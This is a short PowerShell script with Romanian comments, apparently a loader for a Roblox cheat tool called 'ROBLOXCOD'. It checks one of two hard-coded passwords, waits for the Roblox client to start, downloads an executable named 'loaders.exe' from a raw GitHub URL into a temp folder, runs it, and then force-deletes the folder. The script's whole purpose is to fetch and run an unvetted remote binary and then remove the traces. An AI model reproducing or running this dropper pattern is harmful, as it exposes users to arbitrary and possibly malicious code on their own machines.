# =========================================================
# PARTEA I: Autentificare si Verificare Roblox
# =========================================================
$password = Read-Host "Introdu parola"

switch ($password) {
    "fun.regele" {
        Write-Host "[+] Parola acceptata."
    }

    "robloxcod" {
        Write-Host "[+] Verific daca Roblox este deschis..."

        # Verifica daca jocul ruleaza inainte de a continua
        while (-not (Get-Process -Name "RobloxPlayerBeta" -ErrorAction SilentlyContinue)) {
            Write-Host "Deschide Roblox pentru a continua..."
            Start-Sleep -Seconds 2
        }

        Write-Host "[+] Roblox este deschis. Continui..."
    }

    default {
        Write-Host "Parola gresita!"
        Pause
        exit
    }
}

# =========================================================
# PARTEA II: Descarcare si Rulare Aplicatie
# =========================================================
Write-Host "==============================" -ForegroundColor Cyan
Write-Host "     ROBLOXCOD LOADER        " -ForegroundColor Blue
Write-Host "==============================" -ForegroundColor Cyan
Write-Host ""

# Creare director temporar pentru descarcare
$workDir = Join-Path $env:TEMP "ROBLOXCOD"
New-Item -ItemType Directory -Force -Path $workDir | Out-Null

$exeName = "loaders.exe"
# NOTĂ DE SECURITATE: Inlocuieste linkul de mai jos cu sursa ta sigura de descarcare
$exeUrl  = "https://raw.githubusercontent.com/regeele478-glitch/supreme/main/loaders.exe" 
$exePath = Join-Path $workDir $exeName

Write-Host "[+] Descarc $exeName..."
try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -ErrorAction Stop
} catch {
    Write-Host "[-] Eroare la descarcarea fisierului. Verifica conexiunea sau URL-ul." -ForegroundColor Red
    Pause
    exit
}

Write-Host "[+] Pornesc aplicatia..."
$process = Start-Process -FilePath $exePath -PassThru

# Asteapta ca aplicatia sa se inchida inainte de a sterge fisierele
$process.WaitForExit()

# Curatarea fisierelor temporare
Write-Host "[+] Sterg fisierele temporare..."
if (Test-Path $workDir) {
    Remove-Item $workDir -Recurse -Force
}

Write-Host "[✔] Gata!"
Pause